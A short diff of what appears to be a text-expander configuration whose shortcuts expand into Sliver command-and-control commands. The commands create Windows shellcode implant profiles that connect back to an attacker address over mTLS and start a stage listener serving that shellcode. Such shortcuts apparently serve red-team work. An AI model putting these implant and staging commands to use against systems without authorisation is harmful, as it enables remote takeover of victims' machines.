@@ -94,7 +94,7 @@ matches:
     replace: profiles new -e --mtls {{IP}}:443 --format shellcode -o windows  win-shellcode
   
   - trigger: ":sliver32profile"
-    replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
+    replace: profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
 
   - trigger: ":sliverstage"
     replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile win-shellcode
